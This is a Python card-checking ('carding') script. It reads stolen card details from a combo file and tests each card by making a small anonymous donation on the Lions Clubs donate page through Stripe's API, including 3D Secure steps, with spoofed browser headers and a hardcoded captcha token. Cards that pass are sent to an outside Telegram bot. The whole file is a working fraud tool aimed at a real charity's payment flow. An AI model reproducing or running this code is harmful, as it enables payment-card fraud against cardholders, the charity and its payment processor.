import requests,time,webbrowser,json,os,sys
import random,string,uuid

idacc = 'ID'
token = 'TOKEN'

combo = 'x.txt'

file=open(f'{combo}',"+r")
start_num = 0
for P in file.readlines():
	start_num += 1
	n = P.split('|')[0]
	mm=P.split('|')[1]
	yy=P.split('|')[2][-2:]
	cvc=P.split('|')[3].replace('\n', '')
	P=P.replace('\n', '')
	#sessionId1 = generar_uuid()
	#Fingerprint1 = 
	#"".join(random.choice("0123456789abcdef") for _ in range(32))


	#au = user_agent.generate_user_agent()

	#r = requests.session()

	url = "https://m.stripe.com/6"
	headers = {
	    'User-Agent': "Mozilla/5.0 (iPhone; CPU iPhone OS 16_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1",
  'Content-Type': "text/plain",
  'sec-ch-ua': "\"Chromium\";v=\"124\", \"Brave\";v=\"124\", \"Not-A.Brand\";v=\"99\"",
  'sec-ch-ua-platform': "\"Android\"",
  'sec-ch-ua-mobile': "?1",
  'sec-gpc': "1",
  'accept-language': "en-GB,en;q=0.9",
  'origin': "https://m.stripe.network",
  'sec-fetch-site': "cross-site",
  'sec-fetch-mode': "cors",
  'sec-fetch-dest': "empty",
  'referer': "https://m.stripe.network/",
  'priority': "u=1, i"
	}

	payload = "JTdCJTIydjIlMjIlM0ExJTJDJTIyaWQlMjIlM0ElMjJkODVlNThhNmQwOTRlMzViMTExODI3YWY1Yjc0ZjE5NSUyMiUyQyUyMnQlMjIlM0E2MCUyQyUyMnRhZyUyMiUzQSUyMjQuNS40MyUyMiUyQyUyMnNyYyUyMiUzQSUyMmpzJTIyJTJDJTIyYSUyMiUzQSU3QiUyMmElMjIlM0ElN0IlMjJ2JTIyJTNBJTIyZmFsc2UlMjIlMkMlMjJ0JTIyJTNBMCU3RCUyQyUyMmIlMjIlM0ElN0IlMjJ2JTIyJTNBJTIyZmFsc2UlMjIlMkMlMjJ0JTIyJTNBMCU3RCUyQyUyMmMlMjIlM0ElN0IlMjJ2JTIyJTNBJTIyZW4tQ0ElMjIlMkMlMjJ0JTIyJTNBMCU3RCUyQyUyMmQlMjIlM0ElN0IlMjJ2JTIyJTNBJTIyaVBob25lJTIyJTJDJTIydCUyMiUzQTAlN0QlMkMlMjJlJTIyJTNBJTdCJTIydiUyMiUzQSUyMlBERiUyMFZpZXdlciUyQ2ludGVybmFsLXBkZi12aWV3ZXIlMkNhcHBsaWNhdGlvbiUyRnBkZiUyQ3BkZiUyQiUyQnRleHQlMkZwZGYlMkNwZGYlMkMlMjBDaHJvbWUlMjBQREYlMjBWaWV3ZXIlMkNpbnRlcm5hbC1wZGYtdmlld2VyJTJDYXBwbGljYXRpb24lMkZwZGYlMkNwZGYlMkIlMkJ0ZXh0JTJGcGRmJTJDcGRmJTJDJTIwQ2hyb21pdW0lMjBQREYlMjBWaWV3ZXIlMkNpbnRlcm5hbC1wZGYtdmlld2VyJTJDYXBwbGljYXRpb24lMkZwZGYlMkNwZGYlMkIlMkJ0ZXh0JTJGcGRmJTJDcGRmJTJDJTIwTWljcm9zb2Z0JTIwRWRnZSUyMFBERiUyMFZpZXdlciUyQ2ludGVybmFsLXBkZi12aWV3ZXIlMkNhcHBsaWNhdGlvbiUyRnBkZiUyQ3BkZiUyQiUyQnRleHQlMkZwZGYlMkNwZGYlMkMlMjBXZWJLaXQlMjBidWlsdC1pbiUyMFBERiUyQ2ludGVybmFsLXBkZi12aWV3ZXIlMkNhcHBsaWNhdGlvbiUyRnBkZiUyQ3BkZiUyQiUyQnRleHQlMkZwZGYlMkNwZGYlMjIlMkMlMjJ0JTIyJTNBMSU3RCUyQyUyMmYlMjIlM0ElN0IlMjJ2JTIyJTNBJTIyNDE0d184OTZoXzMyZF8zciUyMiUyQyUyMnQlMjIlM0EwJTdEJTJDJTIyZyUyMiUzQSU3QiUyMnYlMjIlM0ElMjItNCUyMiUyQyUyMnQlMjIlM0EwJTdEJTJDJTIyaCUyMiUzQSU3QiUyMnYlMjIlM0ElMjJ0cnVlJTIyJTJDJTIydCUyMiUzQTAlN0QlMkMlMjJpJTIyJTNBJTdCJTIydiUyMiUzQSUyMnNlc3Npb25TdG9yYWdlLWVuYWJsZWQlMkMlMjBsb2NhbFN0b3JhZ2UtZW5hYmxlZCUyMiUyQyUyMnQlMjIlM0ExJTdEJTJDJTIyaiUyMiUzQSU3QiUyMnYlMjIlM0ElMjIwMDAwMDEwMTAwMDAwMDAwMDAwMDAwMTExMTAwMDAwMDAwMDAwMDAwMDAxMDAwMDAwMTExMTEwJTIyJTJDJTIydCUyMiUzQTQ4JTJDJTIyYXQlMjIlM0EzJTdEJTJDJTIyayUyMiUzQSU3QiUyMnYlMjIlM0ElMjIlMjIlMkMlMjJ0JTIyJTNBMCU3RCUyQyUyMmwlMjIlM0ElN0IlMjJ2JTIyJTNBJTIyTW96aWxsYSUyRjUuMCUyMChpUGhvbmUlM0IlMjBDUFUlMjBpUGhvbmUlMjBPUyUyMDE2XzRfMSUyMGxpa2UlMjBNYWMlMjBPUyUyMFgpJTIwQXBwbGVXZWJLaXQlMkY2MDUuMS4xNSUyMChLSFRNTCUyQyUyMGxpa2UlMjBHZWNrbyklMjBWZXJzaW9uJTJGMTYuNCUyME1vYmlsZSUyRjE1RTE0OCUyMFNhZmFyaSUyRjYwNC4xJTIyJTJDJTIydCUyMiUzQTAlN0QlMkMlMjJtJTIyJTNBJTdCJTIydiUyMiUzQSUyMiUyMiUyQyUyMnQlMjIlM0EwJTdEJTJDJTIybiUyMiUzQSU3QiUyMnYlMjIlM0ElMjJmYWxzZSUyMiUyQyUyMnQlMjIlM0EyMiUyQyUyMmF0JTIyJTNBMSU3RCUyQyUyMm8lMjIlM0ElN0IlMjJ2JTIyJTNBJTIyNDM3MmYzNWFlOWY4ODA1ZjdmMzNmZDEyNTRhZGQ2Y2ElMjIlMkMlMjJ0JTIyJTNBMTAlN0QlN0QlMkMlMjJiJTIyJTNBJTdCJTIyYSUyMiUzQSUyMmh0dHBzJTNBJTJGJTJGWF92V09wWVF3MnlpbVB6YTJsZGlsc3NaMVZnbEFoNlYzaHhrVFRja20xNC5GQll2RW9CaENvLWE3eGJncGtjSlp4YW5zMTlleHRjcHFBdm9TcVpmczVZLl9NMEd5d2g0TmdISlRVMUFqUGxnMDRRR2VRblF0b3ZkcTRuUzZCVG9nUXMlMkZXVy1leHFHbEVKOUIxZTRyZ0JwOW16dG9YNFdWODh1OTB1RDc2cmRuM21jJTIyJTJDJTIyYiUyMiUzQSUyMmh0dHBzJTNBJTJGJTJGWF92V09wWVF3MnlpbVB6YTJsZGlsc3NaMVZnbEFoNlYzaHhrVFRja20xNC5GQll2RW9CaENvLWE3eGJncGtjSlp4YW5zMTlleHRjcHFBdm9TcVpmczVZLl9NMEd5d2g0TmdISlRVMUFqUGxnMDRRR2VRblF0b3ZkcTRuUzZCVG9nUXMlMkZXVy1leHFHbEVKOUIxZTRyZ0JwOW16dG9YNFdWODh1OTB1RDc2cmRuM21jJTJGXzRHT2JGOERucEpiRkFRWS01OFpod21CakFNOVV3WXZTSC1ZQ2ZzbTdCZyUyMiUyQyUyMmMlMjIlM0ElMjJZQ3BhQm9MMkRSQUlXUDBoVGl0SXByUDdGc25ZUlgwQlo2VzU1b0gtaDQwJTIyJTJDJTIyZCUyMiUzQSUyMk5BJTIyJTJDJTIyZSUyMiUzQSUyMk5BJTIyJTJDJTIyZiUyMiUzQWZhbHNlJTJDJTIyZyUyMiUzQXRydWUlMkMlMjJoJTIyJTNBdHJ1ZSUyQyUyMmklMjIlM0ElNUIlMjJsb2NhdGlvbiUyMiU1RCUyQyUyMmolMjIlM0ElNUIlNUQlMkMlMjJuJTIyJTNBOTI2JTJDJTIydSUyMiUzQSUyMnd3dy5saW9uc2NsdWJzLm9yZyUyMiUyQyUyMnYlMjIlM0ElMjJ3d3cubGlvbnNjbHVicy5vcmclMjIlMkMlMjJ3JTIyJTNBJTIyMTczMDM5Njg3MDg3NSUzQTEzOGNkMDRlMjg1ZmVhMTM5YTcwYTE3MDAxMzBjNWZkM2NmNDI2NDQ4MjAxYmM1YzQ0OTBiZjY5N2U3MTU0ZmYlMjIlN0QlMkMlMjJoJTIyJTNBJTIyZmZiNDcyNzM3NTlkNGRlNWUwZWUlMjIlN0Q="
	response = requests.post(url, data=payload, headers=headers)
	#print(response.text)
	muid=(response.json()["muid"])
	sid=(response.json()["sid"])
	guid=(response.json()["guid"])
	url = "https://www.lionsclubs.org/en/donate"
	headers = {
		'User-Agent': "Mozilla/5.0 (iPhone; CPU iPhone OS 16_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1",
  'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
  'Accept-Encoding': "gzip, deflate, br, zstd",
  'upgrade-insecure-requests': "1",
  'sec-gpc': "1",
  'sec-fetch-site': "same-origin",
  'sec-fetch-mode': "navigate",
  'sec-fetch-user': "?1",
  'sec-fetch-dest': "document",
  'sec-ch-ua': "\"Chromium\";v=\"124\", \"Brave\";v=\"124\", \"Not-A.Brand\";v=\"99\"",
  'sec-ch-ua-mobile': "?1",
  'sec-ch-ua-platform': "\"Android\"",
  'accept-language': "en-GB,en;q=0.9",
  'referer': "https://www.lionsclubs.org/en/donate",
  'priority': "u=0, i",
  'Cookie': f"nav=public; __stripe_mid={muid}; __stripe_sid={sid}"
	}
	response = requests.get(url, headers=headers)
	#print(response.text)
	url = "https://www.lionsclubs.org/en/donate"
	params = {
		'ajax_form': "1",
  '_wrapper_format': "drupal_ajax"
	}
	data = {
		'campaign': '1',
    'is_this_a_recurring_gift_': 'One-Time-Gift',
    'how_much_would_you_like_to_donate_': 'other_amount',
    'donate_amount': '5.00',
    'who_is_this_gift_from_': 'lion',
    'business_name': '',
    'club_or_district_name': '',
    'club_or_district_id': '',
    'first_name': 'Pinta',
    'last_name': 'Last',
    'email_address_2': 'pintaxv@gmail.com',
    'phone_number_optional': '503567754',
    'address[address]': '112 west',
    'address[address_2]': '',
    'address[postal_code]': '10082',
    'address[city]': 'Newyork',
    'address[country]': 'United States',
    'address[state_province]': 'New York',
    'address_provinces_canada': '',
    'address_states_india': '',
    'sponsoring_lions_club_name': '',
    'sponsoring_lions_club_id': '',
    'club_name': 'Pinta',
    'club_id': '',
    'member_id_optional_': '',
    'is_this_an_anonymous_gift_': 'yes',
    'recognition_request': 'no recognition',
    'recognition_name': '',
    'recognition_plaque_display': '',
    'recognition_club_name': '',
    'recognition_member_id': '',
    'recognition_message': '',
    'special_instructions': '',
    'recognition_shipping_first_name': '',
    'recognition_shipping_last_name': '',
    'recognition_shipping_phone': '',
    'recognition_shipping_address[address]': '',
    'recognition_shipping_address[address_2]': '',
    'recognition_shipping_address[postal_code]': '',
    'recognition_shipping_address[city]': '',
    'recognition_shipping_address[country]': '',
    'recognition_shipping_address[state_province]': '',
    'shipping_address_provinces_in_canada': '',
    'shipping_address_states_india': '',
    'recognition_shipping_comments': '',
    'how_would_you_like_to_pay_': 'credit-card',
    'name_on_card': 'Pinta past',
    'stripe_card[payment_intent]': '',
    'stripe_card[client_secret]': '',
    'stripe_card[trigger]': '1743094190487',
    'leave_this_field_blank': '',
    'url_redirection': '',
    'form_build_id': 'form-CUm1jKZb0fRGsJrvm4jg5Ba7BhIdGWDhxwSKDoq7BQk',
    'form_id': 'webform_submission_donation_paragraph_34856_add_form',
    'antibot_key': 'B7N6p5OEzhElwYbQ63su_hzatGXEpYwx7fLMuSVftNs',
    'form_instance_id': '67e5812c94b59',
    '_triggering_element_name': 'stripe-stripe_card-button',
    '_triggering_element_value': 'Update',
    '_drupal_ajax': '1',
    'ajax_page_state[theme]': 'lionsclubs',
    'ajax_page_state[theme_token]': '',
    'ajax_page_state[libraries]': 'eJyFUFtywyAMvBAxR2IElgmpjKgk0uT2xeM0bZNm-qPHrp4L1Upk87D7aWFZXUQzlICXxopzWAqNVH3GigLk0hvOxVgCpMQyF67-Hk2LcDWss0tMLJEvfsYFOtkdCKVSqegf8sEL-jKapQJNp_eOct3vSV2N15Cox0CcYOz2f2AuM2fCYJB9HuYxn-AEl9_g6mgcrUGZJCiCpKP_Ed_YcxHrQCFxPeMQajxMqRzUpDQ8nHQv204ZIhHHoVEDgSzQjupn6W089I1MvbYeqegRZ7cvCtBKgG6ceG2Ehv4F7valfndOr2q4-giKzmJYMcOKtT8DaldCdR8YN0X9zU_bWNYy5j4ySDgabZrRoJBOCuf_i4zz0PZl2YqqkF_z3DZtn6_84nUEyZ7ozXwCj_UYIQ',
	}
	headers = {
		'User-Agent': "Mozilla/5.0 (iPhone; CPU iPhone OS 16_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1",
  'Accept': "application/json, text/javascript, */*; q=0.01",
  'Accept-Encoding': "gzip, deflate, br, zstd",
  'Content-Type': "application/x-www-form-urlencoded",
  'sec-ch-ua': "\"Chromium\";v=\"124\", \"Brave\";v=\"124\", \"Not-A.Brand\";v=\"99\"",
  'x-requested-with': "XMLHttpRequest",
  'sec-ch-ua-mobile': "?1",
  'sec-ch-ua-platform': "\"Android\"",
  'sec-gpc': "1",
  'accept-language': "en-GB,en;q=0.9",
  'origin': "https://www.lionsclubs.org",
  'sec-fetch-site': "same-origin",
  'sec-fetch-mode': "cors",
  'sec-fetch-dest': "empty",
  'referer': "https://www.lionsclubs.org/en/donate",
  'priority': "u=1, i",
  'Cookie': f"nav=public; __stripe_mid={muid}; __stripe_sid={sid}"
	}
	response = requests.post(url, params=params, data=data, headers=headers)
	if 'payment_intent' in response.text:
		int1 =(response.text.split('"payment_intent":')[1].split('"')[1])
	else:
		print(  "Declined ❌")
		continue
    
	#print(f"{int1}")
	response=str(response.cookies)
	cookie=response.split(' for ')[0].split('<Cookie ')[1]
	url = "https://api.stripe.com/v1/payment_methods"
	payload = f"type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid={guid}&muid={muid}&sid={sid}&pasted_fields=number&payment_user_agent=stripe.js%2Fd80a055d16%3B+stripe-js-v3%2Fd80a055d16%3B+card-element&referrer=https%3A%2F%2Fwww.lionsclubs.org&time_on_page=129447&key=pk_live_gaSDC8QsAaou2vzZP59yJ8S5&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiSDhTcDN4T2NRZUtHbCtpNjZvaHpvYUxLOXh3NVpKcndYam5WQkFnbTRHcWUxbXU0TG1UK2NjQm94cnJ0YS92aWdnTUt5NDU0Q3RCdjdDd0poMHh3NVFHcXV3cVhHRHdPSytFM0JnVGQ2QjVBT3hkZjNtVURqOElVcG43dlozNmZkZkVKZHNhV3BZcnpJSlRtOEdVMDZJdWoxdlliSVRoeW4yUi9GSEd6MTZYQzdOUld4ZVd4OStPMWYva3JyV0p3S0RmQU5ZWEJXQlBwUjVYVjdVREhHN0d5RkhTeXBDMmMzNTZHK2Z3bENSclY3UE1tRGZDendPdW50RWh6cVJpVWsrL2UrOVE4WjlhUGtCeVdJNUN5Z1IxZ21LWU9abVBlQ2NRS0xEYmI1UGR1YnFPYzBnelVTbUg1MzlsSndDS3puUTI1SzVFOGNyYTJPbHN0eXl6bVJaaktmYVJFR1laSzF4RStIa1NUZW9Oblo4YW5DbEhMQjJsU3J2N0pTV0Fabm5CSm1VQitPQWhEbG1aaURMYUpsS25SVGNEY0Q5UFRSTmFmYVNZSGo5R2Nta01TaC80SVl0c0hzZHp5eHhsbHpScExleFR2WEwvVVVtTXlPdWoxdzJGMWpydWVCa3ZKSWZaemZETm1rd2VEVkNjMFdCUGtzT0twSUtZRzhpLzBsUTV6aXdhd3p2eVE5d3p4WUpiSDlRTkRQeTRlb0x5Z1BpMUVoYkNPeVpJbEE0UlZWQlA4OFRudFAvM29QM2RoMTMvc0pBdVp4NlZoMzJVWUhRaFh3R1hGNHo3SjZEQ1JCd1p4MkVFSk1VUm1HN202TTBBRmtrTDZBbUxQY0JkZDk4YlBkcCtSNVdRbVgxcnJza1creXRTVnY2bExHWlRGcXhPekJkZzg3SVJvTzBWdGROaFRFRmxRZi9OYkpnN0IrQkNWNUVCYWRlWjJQSFZpWWFtRHhoR3pPWDJ4WWoxYkRqNUhsUkFZcVRUNXpvRDd6RzlmbGN2SVhsYVZ4TGRzY2YzRTh5ODZJNEgwUDR2ZlZ0bzBIelFLOVFXYXlNMWJXdlZ2MThQN1NlWnVEQnZ2SFVscDk3OEcxUnQyWXVzc0pHQzk1WXRORUE5UlpTMk9COWVwaU8zUmFsemNwU0VyRUlQZmlvK093NXhxVkk4Z1dQdFBIWGNmQTRGNGZPRERuRTR1bTFrSXk4S3hIL3JXZkNEMW05R0xIem9pbHIxUXE2VVhpUnRYRGhtUUpEVWpHOUFja2RDd3JPb0g2L3JkRHFOSzhIT0VUNDdGL2gydFlGcE5XT1B0Uy8rby9uYVF6V3Q4Y2Z3eG9IQ1dDR1pHdWkvU0VWL0xFdkpndXhPQUFjMGx2MGU2aDZkcTNSMHpIcUZvaUY2VWVrVXBBNmNEM3JmV3gzaVpLd29xYk15eC8yYWxSYzRRUHA1K3dFcmtiazBBelBQTFhzMEdjS2V2SVp6Z2Mrd2RZcys0VGVJSkNsWExFenYzZm5QSExrcXRIdmdpSS9FUElGempNRmFxTjRtSHdpTWlGN2w5Ri9ZWDRZWFh6VUpMOHhxd3JZNzZvbDROaElTejZCdjBmWGt6UHhGc3RaVnlOdjg3NlROUDQvcG82QlpvNzZZVFg5azNOMHFWbDNKSHZiRWhrem1yUGFXdENMUTloRE84T1FiV1o0SDVOWmd4ZlNENjJNV1BxMU5KUWE5cHEyM2taLzdPdWdqQU1LdCt3Uy9WTCtMUUZtTm5jdzB3M1lWcTVtVGUrKzVkemtmRXVCa0dzNUR6WTY0bXVxT2RyWEM0cENlL1Q0VUlRTUFHeUJNT0tvdkNOWlYrVUR3OTYvSWRWdWQ4cEErc1NHZDNNdXZNTzlJbGovZzgxMlhnQythQmt2Qy8wNmJsTXVKekFRb1V1SThMQWVkSGJkcWZhUlZ4eU9ESGR3Z0pjblV0a09oSGtBUk5aSTdFZmhHRFN3NTlVbDlETVorUXpMQlBuOTBWcDNHYk0zd3FtdU5LQXZiODRNeUhDckRnemtpSlRhajc0eHlrQm1zdW1SeTRRMjNEMlRNM0t4UUNzZ29mMUF0Y25DcGhydDZKVCtsdXZZZG43SDJOMFI2QVVvazVGVzF5VzkvRTJZODVJSm5KTUhsRFdhRDR5SjFteHRFZ1ZleWt1dHkzQ1pVOER5UUxBS0FrM0U3WllNMUVSSHZBV2xMOGM2WWRQVWtTU2haTi9INFJwSTY5ZThjbVBiRzFFY05Xd2R3UTFHQ1hKTzhVMVBsOVRUTTRINzE3T0xoamRRTUtCZERuTHNOYnd4eS9PNVJveTdlYm9nbjR1eHhIRlgzdlhhaUFKclZUb1UxS3M2SHdOVHVNWG96cHM4QkgxMm1yTlZkdVF6R2J5NFM3SlEvZlRlTi9KaU1zSXZkbm1yTnoxRTlVYkxRNUx0NHdKSitQd0I0dkJYYm5WM0ZKamU3UnJ2bEx0RU1VcytnengxQURQUFBDMnVQMmpDUU1may9RS3Qzc3N2Y2FOVXNYWnJWd2p4M2xYK0s1emZmcWViOTZRRXNxVG1NeFVZUXYzWmZlalMyalJjanM4a3JoTldHUmMwUnJRdHBEamVoV2JFWkRYMjhMcVNxTTNXcTdRUEY4SUlZa2xqa0FDN0Z1YkFRMW44a0xONXJGa2FEaUZVaUE1YnBEcHVZRW1aZlJpNFNGZXR1Z2hEY2JCNGh0aXlNRjdIST0iLCJleHAiOjE3NDMwOTQyOTQsInNoYXJkX2lkIjo1MzU3NjU1OSwia3IiOiIyNjllMTc5NyIsInBkIjowLCJjZGF0YSI6InI1SUNqUTJ3aGVWTzc5a3JPYlR4Q1k4bzdLSVg3NExuckRnaUtRL1pKMkxsMHZQVkhnK2ZCMkFTQldRbmVJWVBZZndDTHd5SW1vNVdJVHdnb1BBaStCMmtNdEFTK1ZUUG9pSFdhSnFSUHY3VWJsdWJLUS9FWjh3bUY2S0Vpdk5FOUZPNUdPZGovT0tNRVpDWlhPVWZOT0xva1llYTNKNEpIcnFBaWFsMXJURmZvY2h3TG9iMXNYazdUcTNVbS9pNWZ6b0VZMG1JTmpmQmEwRTkifQ.Sm3YZR6cqnYTxqPOm4dUeBPA3p5y25x7GiKYbNNTBSw"
	headers = {
		'User-Agent': "Mozilla/5.0 (iPhone; CPU iPhone OS 16_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1",
	  'Accept': "application/json",
	  'Accept-Encoding': "gzip, deflate, br, zstd",
	  'Content-Type': "application/x-www-form-urlencoded",
	  'sec-ch-ua': "\"Chromium\";v=\"124\", \"Brave\";v=\"124\", \"Not-A.Brand\";v=\"99\"",
	  'sec-ch-ua-mobile': "?1",
	  'sec-ch-ua-platform': "\"Android\"",
	  'sec-gpc': "1",
	  'accept-language': "en-GB,en;q=0.9",
	  'origin': "https://js.stripe.com",
	  'sec-fetch-site': "same-site",
	  'sec-fetch-mode': "cors",
	  'sec-fetch-dest': "empty",
	  'referer': "https://js.stripe.com/",
	  'priority': "u=1, i"
	}
	response = requests.post(url, data=payload, headers=headers)
	if 'pm_' in response.text:
		pm=(response.json()['id'])
	url = "https://www.lionsclubs.org/lions_payment/method_id"
	payload = json.dumps({
		"paymentMethodId": pm,
		  "paymentintent": int1,
		  "currentPath": "\/node\/13261"
	})
	headers = {
		'User-Agent': "Mozilla/5.0 (iPhone; CPU iPhone OS 16_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1",
		  'Accept': "application/json",
		  'Accept-Encoding': "gzip, deflate, br, zstd",
		  'Content-Type': "application/json",
		  'sec-ch-ua': "\"Chromium\";v=\"124\", \"Brave\";v=\"124\", \"Not-A.Brand\";v=\"99\"",
		  'sec-ch-ua-mobile': "?1",
		  'sec-ch-ua-platform': "\"Android\"",
		  'sec-gpc': "1",
		  'accept-language': "ar-EG,ar;q=0.9",
		  'origin': "https://www.lionsclubs.org",
		  'sec-fetch-site': "same-origin",
		  'sec-fetch-mode': "cors",
		  'sec-fetch-dest': "empty",
		  'referer': "https://www.lionsclubs.org/en/donate",
		  'priority': "u=1, i",
		  'Cookie': f"__stripe_mid={muid}; __stripe_sid={sid}; {cookie}"
	}
	response = requests.post(url, data=payload, headers=headers)
		#print(response.json())
	csc = response.json()['clientSecretKey']
	#print(f"{csc}")
	url = f"https://api.stripe.com/v1/payment_intents/{int1}/confirm"
	payload = f"payment_method={pm}&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_gaSDC8QsAaou2vzZP59yJ8S5&client_secret={csc}"
	headers = {
		'Host': 'api.stripe.com',
    'Accept': 'application/json',
    'Sec-Fetch-Site': 'same-site',
    'Accept-Language': 'en-CA,en-US;q=0.9,en;q=0.8',
    # 'Accept-Encoding': 'gzip, deflate, br',
    'Sec-Fetch-Mode': 'cors',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'https://js.stripe.com',
    'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',
    'Referer': 'https://js.stripe.com/',
    # 'Content-Length': '208',
    'Connection': 'keep-alive',
    'Sec-Fetch-Dest': 'empty',
	}
	response = requests.post(url, data=payload, headers=headers)
	status=(response.json()["status"])
	if 'requires_source_action' == status:
		tr=response.text.split('"server_transaction_id": ')[1].split('"')[1]
		pyc=response.text.split('"three_d_secure_2_source": ')[1].split('"')[1]
		cod='{"threeDSServerTransID":"'+tr+'"}'
	url = "https://www.base64encode.org"
	payload = f'input={cod}&charset=UTF-8&separator=lf'
	headers = {
		'User-Agent': "Mozilla/5.0 (iPhone; CPU iPhone OS 16_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1",
			  'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
			  'Accept-Encoding': "gzip, deflate, br, zstd",
			  'Content-Type': "application/x-www-form-urlencoded",
			  'cache-control': "max-age=0",
			  'sec-ch-ua': "\"Chromium\";v=\"124\", \"Google Chrome\";v=\"124\", \"Not-A.Brand\";v=\"99\"",
			  'sec-ch-ua-mobile': "?1",
			  'sec-ch-ua-platform': "\"Android\"",
			  'upgrade-insecure-requests': "1",
			  'origin': "https://www.base64encode.org",
			  'sec-fetch-site': "same-origin",
			  'sec-fetch-mode': "navigate",
			  'sec-fetch-user': "?1",
			  'sec-fetch-dest': "document",
			  'referer': "https://www.base64encode.org/",
			  'accept-language': "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7",
			  'priority': "u=0, i",
	}
	response = requests.post(url, data=payload, headers=headers)
	data=(response.text.split('spellcheck="false">')[2].split('<')[0])
	url = "https://api.stripe.com/v1/3ds2/authenticate"
	payload = f'source={pyc}&browser=%7B%22fingerprintAttempted%22%3Atrue%2C%22fingerprintData%22%3A%22{data}%22%2C%22challengeWindowSize%22%3Anull%2C%22threeDSCompInd%22%3A%22Y%22%2C%22browserJavaEnabled%22%3Afalse%2C%22browserJavascriptEnabled%22%3Atrue%2C%22browserLanguage%22%3A%22en-GB%22%2C%22browserColorDepth%22%3A%2224%22%2C%22browserScreenHeight%22%3A%22852%22%2C%22browserScreenWidth%22%3A%22393%22%2C%22browserTZ%22%3A%22-120%22%2C%22browserUserAgent%22%3A%22Mozilla%2F5.0+(iPhone%3B+CPU+iPhone+OS+17_4_1+like+Mac+OS+X)+AppleWebKit%2F605.1.15+(KHTML%2C+like+Gecko)+Version%2F17.4.1+Mobile%2F15E148+Safari%2F604.1%22%7D&one_click_authn_device_support[hosted]=false&one_click_authn_device_support[same_origin_frame]=false&one_click_authn_device_support[spc_eligible]=false&one_click_authn_device_support[webauthn_eligible]=true&one_click_authn_device_support[publickey_credentials_get_allowed]=false&key=pk_live_gaSDC8QsAaou2vzZP59yJ8S5'
	headers = {
		'User-Agent': "Mozilla/5.0 (iPhone; CPU iPhone OS 16_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1",
			  'Accept': "application/json",
			  'Accept-Encoding': "gzip, deflate, br, zstd",
			  'Content-Type': "application/x-www-form-urlencoded",
			  'sec-ch-ua': "\"Chromium\";v=\"124\", \"Brave\";v=\"124\", \"Not-A.Brand\";v=\"99\"",
			  'sec-ch-ua-mobile': "?1",
			  'sec-ch-ua-platform': "\"Android\"",
			  'sec-gpc': "1",
			  'accept-language': "en-GB,en;q=0.9",
			  'origin': "https://js.stripe.com",
			  'sec-fetch-site': "same-site",
			  'sec-fetch-mode': "cors",
			  'sec-fetch-dest': "empty",
			  'referer': "https://js.stripe.com/",
			  'priority': "u=1, i"
	}
	response = requests.post(url, data=payload, headers=headers)
	
	if 'challenge_required' in response.text:
		print(f"[{start_num}] {P} ->|3d socure✅")
		requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={idacc}&text=[{start_num}] {P} 3d socure ✅')
		time.sleep(18)
	elif 'processing_error' or 'falid' in response.text:
 		#state=(response.json()['state'])
		print(f"[{start_num}] {P} -> ERROR ❌")
		time.sleep(18)
	else:
		print(f"[{start_num}] {P} -> response.text❌")
		time.sleep(600)
